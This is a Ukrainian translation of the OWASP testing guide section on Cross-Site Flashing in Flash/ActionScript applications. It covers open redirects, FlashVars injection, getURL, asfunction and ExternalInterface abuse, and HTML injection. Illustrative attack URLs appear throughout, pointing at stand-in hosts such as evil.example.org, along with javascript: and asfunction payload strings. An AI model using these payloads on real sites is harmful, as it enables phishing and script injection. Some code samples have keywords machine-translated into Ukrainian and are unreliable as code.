# Тестування міжсайтового перепрошивки
|ID|
|----|
|WSTG-CLNT-08|
## Резюме
ActionScript, заснований на ECMAScript, є мовою, яка використовується програмами Flash для інтерактивних потреб. Існує три версії мови ActionScript. ActionScript 1.0 і ActionScript 2.0 дуже схожі, оскільки ActionScript 2.0 є розширенням ActionScript 1.0. ActionScript 3.0, представлений у Flash Player 9, є переписаною мовою для підтримки об’єктно-орієнтованого дизайну.

ActionScript, як і будь-яка інша мова, має деякі шаблони реалізації, які можуть призвести до проблем безпеки. Зокрема, оскільки Flash-додатки часто вбудовані в браузери, такі уразливості, як DOM-based Cross Site Scripting (DOM XSS), можуть бути присутніми в несправних Flash-додатках.
Cross-Site Flashing (XSF) — це вразливість, яка має подібний вплив на XSS.
XSF виникає, коли такі сценарії ініціюються з різних доменів:

-	Один фільм завантажує інший фільм за допомогою функцій loadMovie* (або інших хаків) і має доступ до тієї самої пісочниці або її частини.
-	Сторінка HTML використовує JavaScript для керування фільмом Adobe Flash, наприклад, викликом:
	- GetVariable для доступу до загальнодоступних і статичних об’єктів Flash із JavaScript у вигляді рядка.
	- SetVariable для встановлення статичного або загальнодоступного Flash-об’єкта на нове рядкове значення за допомогою JavaScript.
-	Неочікуваний зв’язок між браузером і програмою SWF, що може призвести до викрадення даних із програми SWF.
XSF можна виконати шляхом примусового завантаження пошкодженого SWF-файлу зовнішнього поганого Flash-файлу. Ця атака може призвести до XSS або модифікації графічного інтерфейсу, щоб обдурити користувача, щоб він вставив облікові дані у підроблену форму Flash. XSF можна використовувати за наявності Flash HTML Injection або зовнішніх файлів SWF, коли використовуються методи loadMovie*.

## Відкрийте перенаправлячі
SWF-файли мають можливість навігації в браузері. Якщо SWF приймає місце призначення як FlashVar, тоді SWF можна використовувати як відкритий переспрямовувач. Відкритий перенаправляч — це будь-яка функція веб-сайту на надійному веб-сайті, яку зловмисник може використати для перенаправлення кінцевого користувача на шкідливий веб-сайт. Вони часто використовуються під час фішингових атак. Подібно до міжсайтового сценарію, атака передбачає натискання користувачем шкідливого посилання.

У випадку Flash шкідлива URL-адреса може виглядати так:

http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
У наведеному вище прикладі кінцевий користувач може побачити, що URL-адреса починається з його улюбленого надійного веб-сайту, і натиснути його. Посилання завантажить надійний SWF, який приймає getURLValue і надає його виклику навігації браузера ActionScript:

getURL(_root.getURLValue,"_self");
Це призвело б до переходу браузера до шкідливої URL-адреси, наданої зловмисником. На даний момент фішер успішно використав довіру користувача до trusted.example.org, щоб обманом змусити користувача відвідати їхній шкідливий веб-сайт. Звідти вони могли запустити нульовий день, здійснити підробку оригінального веб-сайту або будь-який інший тип атаки. SWF-файли можуть ненавмисно діяти як відкритий переспрямовувач на веб-сайті.

Розробникам слід уникати використання повних URL як FlashVars. Якщо вони планують здійснювати навігацію лише на власному веб-сайті, їм слід використовувати відносні URL-адреси або переконатися, що URL-адреса починається з довіреного домену та протоколу.

## Атаки та версія Flash Player
З травня 2007 року компанія Adobe випустила три нові версії Flash Player. Кожна нова версія обмежує деякі атаки, описані раніше.

|Версія програвача|asfunction|Зовнішній інтерфейс|GetURL|HTML Injection|
|----|----|----|----|----|
|v9.0|r47/48|Так|Так|Так|
|v9.0|r115|Ні|Так|Так|
|v9.0|r115|Ні|Так|Так|
|v9.0|r124|Ні|Так|Частково|

## Цілі тесту
Декомпілювати та аналізувати код програми.
Оцініть вхідні дані та використання небезпечних методів.
## Як тестувати
Після першої публікації Тестування Flash-додатків було випущено нові версії Flash Player, щоб пом’якшити деякі атаки, які будуть описані. Тим не менш, деякі проблеми все ще можуть бути використані, оскільки вони є результатом небезпечних методів програмування.
### Декомпіляція
Оскільки SWF-файли інтерпретуються віртуальною машиною, вбудованою в сам плеєр, їх можна потенційно декомпілювати та аналізувати. Найвідомішим і безкоштовним декомпілятором ActionScript 2.0 є flare.

Щоб декомпілювати файл SWF за допомогою flare, просто введіть:

$ flare hello.swf

Це призводить до створення нового файлу під назвою hello.flr.

Декомпіляція допомагає тестувальникам, оскільки вона дозволяє тестувати програму Flash у білому ящику. Швидкий веб-пошук може привести вас до різноманітних дизассемблерів та інструментів безпеки спалаху.

### Невизначені змінні FlashVars
FlashVars — це змінні, які розробник SWF планував отримати з веб-сторінки. FlashVars зазвичай передаються з тегу Object або Embed у HTML. Наприклад:
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
FlashVars також можна ініціалізувати з URL:

http://www.example.org/somefilename.swf?var1=val1&var2=val2

У ActionScript 3.0 розробник повинен явно призначити значення FlashVar локальним змінним. Як правило, це виглядає так:

var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;<br>
var var1:String = String(paramObj["var1"]);<br>
var var2:String = String(paramObj["var2"]);<br>
У ActionScript 2.0 будь-яка неініціалізована глобальна змінна вважається FlashVar. 
Глобальні змінні – це ті змінні, перед якими додаються _root, _global або _level0. Це означає, що якщо такий атрибут, як _root.varname, не визначений у всьому потоці коду, він може бути перезаписаний параметрами URL:

http://victim/file.swf?varname=value

Незалежно від того, чи ви використовуєте ActionScript 2.0 чи ActionScript 3.0, FlashVars може бути вектором атаки. Давайте розглянемо код ActionScript 2.0, який є вразливим:

приклад:

movieClip 328 __Packages.Locale {

#initclip<br>
    if (!_global.Locale) {<br>
    var v1 = функція (on_load) {<br>
        var v5 = новий XML();<br>
        var v6 = це;<br>
        v5.onLoad = функція (успіх) {<br>
        якщо (успіх) {<br>
            trace('Locale loaded xml');<br>
            var v3 = this.xliff.file.body.$trans_unit;<br>
            змінна v2 = 0;<br>
            while (v2 < v3.length) {<br>
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;<br>
            ++v2;<br>
            }<br>
            on_load();<br>
        } ще {}<br>
        };<br>
        if (_root.language != undefined) {<br>
        Locale.DEFAULT_LANG = _root.language;<br>
        }<br>
        v5.load(Locale.DEFAULT_LANG + '/player_' +<br>
                            Locale.DEFAULT_LANG + '.xml');<br>
    };<br>
    
Вищенаведений код може бути атакований за допомогою запиту:

http://victim/file.swf?language=http://evil.example.org/malicious.xml?

## Небезпечні методи
Коли точку входу ідентифіковано, дані, які вона представляє, можуть бути використані небезпечними методами. Якщо дані не відфільтровано чи перевірено, це може призвести до певних уразливостей.

Небезпечними методами з версії r47 є:

-	loadVariables()
-	loadMovie()
-	getURL()
-	loadMovie()
-	loadMovieNum()
-	FScrollPane.loadScrollContent()
-	LoadVars.load
-	LoadVars.send
-	XML.load ('url')
-	LoadVars.load ('url')
-	Sound.loadSound( 'url' , isStreaming );
-	NetStream.play( 'url');
-	flash.external.ExternalInterface.call(_root.callback)
-	htmlТекст

## Експлуатація Reflected XSS
Swf-файл має бути розміщено на хості жертви, і слід використовувати техніку відображеного XSS. Зловмисник змушує веб-переглядач завантажити чистий swf-файл безпосередньо в рядок розташування (шляхом переспрямування чи соціальної інженерії) або завантажуючи його через iframe зі зловмисної сторінки:

<iframe src='http://victim/path/to/file.swf'></iframe>
У цій ситуації веб-переглядач самостійно створить HTML-сторінку, як якщо б вона була розміщена на хості-жертві.

## GetURL (AS2) / NavigateToURL (AS3)
Функція GetURL у ActionScript 2.0 і NavigateToURL у ActionScript 3.0 дозволяє фільму завантажувати URI у вікно браузера. Якщо невизначена змінна використовується як перший аргумент для getURL:

getURL(_root.URI,'_targetFrame');<br>

Або якщо FlashVar використовується як параметр, який передається у функцію navigateToURL:

var request:URLRequest = new URLRequest(FlashVarSuppliedURL);<br>
navigateToURL(запит);<br>
Тоді це означатиме, що можна викликати JavaScript у тому самому домені, де розміщено фільм, запитуючи:

http://victim/file.swf?URI=javascript:evilcode

getURL('javascript:evilcode','_self');

Те саме можливо, коли лише деяка частина getURL контролюється за допомогою ін’єкції DOM із ін’єкцією Flash JavaScript:

getUrl('javascript:function('+_root.arg+')')

## Використання asfunction
Ви можете використовувати спеціальний протокол asfunction, щоб змусити посилання виконувати функцію ActionScript у файлі SWF замість відкриття URL-адреси. До випуску функції Flash Player 9 r48 можна було використовувати для кожного методу, який має URL як аргумент. Після цього випуску функцію asfunction було обмежено для використання в текстовому полі HTML.

Це означає, що тестер може спробувати ввести:

asfunction:getURL,javascript:evilcode<br>
у кожному небезпечному методі, наприклад:

loadMovie(_root.URL)<br>
за запитом:

http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode

## Зовнішній інтерфейс
ExternalInterface.call — це статичний метод, запроваджений Adobe для покращення взаємодії програвача та браузера для ActionScript 2.0 і ActionScript 3.0.<br>

З точки зору безпеки ним можна зловживати, якщо частину його аргументів можна контролювати:

flash.external.ExternalInterface.call(_root.callback);<br>
схема атаки для такого роду вади може бути приблизно такою:

eval (злий код)<br>
оскільки внутрішній JavaScript який виконує браузер, буде щось подібне до:

eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')<br>

## Впровадження HTML
Об’єкти TextField можуть відтворювати мінімальний HTML, установивши:

tf.html = правда<br>
tf.htmlText = '<tag>текст</tag>'<br>
Таким чином, якщо деяка частина тексту може контролюватися тестером, тег <a> або тег зображення можуть бути вставлені, що призведе до зміни графічного інтерфейсу користувача або XSS-атаки на браузер.

Деякі приклади атак з тегом <a>:

Прямий XSS: <a href='javascript:alert(123)'>
Виклик функції: <a href='asfunction:function,arg'>
Виклик загальнодоступних функцій SWF: <a href='asfunction:_root.obj.function, arg'>
Викликати рідну статику як функцію: <a href='asfunction:System.Security.allowDomain,evilhost'>
Також можна використовувати тег зображення.
  
